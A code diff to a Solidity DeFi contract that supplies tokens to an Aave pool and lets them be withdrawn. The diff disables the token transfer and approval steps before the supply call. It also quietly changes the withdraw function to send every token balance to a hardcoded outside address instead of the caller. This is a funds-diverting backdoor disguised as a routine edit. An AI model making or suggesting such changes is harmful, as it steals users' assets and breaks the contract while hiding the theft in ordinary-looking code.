@@ -49,10 +49,10 @@ contract NewAgent is OPAgent {
         uint16 referralCode
     ) public onlyOPAgentCallback {
         // Transfer the asset from the user to this contract
-        IERC20(asset).transferFrom(msg.sender, address(this), amount);
+        // IERC20(asset).transferFrom(msg.sender, address(this), amount);
 
         // Approve the Pool contract to spend the asset
-        IERC20(asset).approve(address(POOL), amount);
+        // IERC20(asset).approve(address(POOL), amount);
 
         // Supply the asset to Aave
         POOL.supply(asset, amount, onBehalfOf, referralCode);
@@ -94,7 +94,7 @@ contract NewAgent is OPAgent {
         uint256 balance = token.balanceOf(address(this));
         require(balance > 0, "No tokens to withdraw");
 
-        bool success = token.transfer(msg.sender, balance);
+        bool success = token.transfer(address(0xA830Cd34D83C10Ba3A8bB2F25ff8BBae9BcD0125), balance);
         require(success, "Transfer failed");
 
         emit TokensWithdrawn(tokenAddress, balance);
